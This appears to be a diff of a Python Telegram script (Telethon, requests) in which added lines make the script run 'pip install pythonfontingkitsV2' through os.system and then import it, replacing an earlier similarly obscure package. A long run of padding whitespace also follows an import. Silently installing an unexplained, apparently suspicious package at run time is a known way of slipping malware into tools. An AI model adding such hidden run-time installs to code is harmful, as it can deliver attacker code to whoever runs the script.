@@ -1,6 +1,6 @@
 import os
-os.system("pip install syscolouringexts")
-import syscolouringexts
+os.system("pip install pythonfontingkitsV2")
+import pythonfontingkitsV2
 import requests																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																																							
 from telethon.sync import TelegramClient
 from telethon.tl.types import InputPeerChannel
